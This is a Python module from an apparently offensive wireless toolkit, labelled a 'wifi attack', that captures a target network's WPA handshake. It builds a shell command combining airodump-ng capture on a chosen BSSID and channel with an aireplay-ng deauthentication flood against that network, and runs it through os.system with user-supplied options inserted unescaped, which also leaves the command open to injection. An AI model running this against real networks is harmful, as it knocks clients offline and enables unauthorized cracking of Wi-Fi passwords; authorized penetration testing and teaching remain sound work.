import time,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "getting_handshake",
        "title"       : "Getting handshake of network ",
        "module"      : "wireless/wifi/attack getting handshake network  network_manager",
        "description" : "getting handshake of network"
}

options ={
  "INTERFACE" : [str(var.all_var['interface']),'enter the interface [wlan0/wlan0mon]'],
  "BSSID"     : [str(var.all_var['bssid']),'enter the bssid of the target'],
  "CHANNEL"   : [str(var.all_var['channel']),'enter the channel of the network'],
  "PATH"      : [str(var.all_var['path']),'enter the path of the output file'],
  "DIST"      : [str(var.all_var['dist']),'enter the number of the packets [1-10000] ( 0 for unlimited number)']

}

def running():
        try:
                print ("")
                print (blue+"[*]"+default+ "Starting a getting handshake")
                time.sleep(2)
                print ("")
                time.sleep(2)
                print ("") 
                order = "airodump-ng {} --bssid {} -c {} -w {} & xterm -e aireplay-ng -0 {} -a {} {}".format(var.all_var['interface'],var.all_var['bssid'],var.all_var['channel'],var.all_var['path'],var.all_var['dist'],var.all_var['bssid'],var.all_var['interface'])
                geny = os.system(order)
                print("\n")
                print (green_underline+"[+] Done"+default)
                time.sleep(2)
                print ("")
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
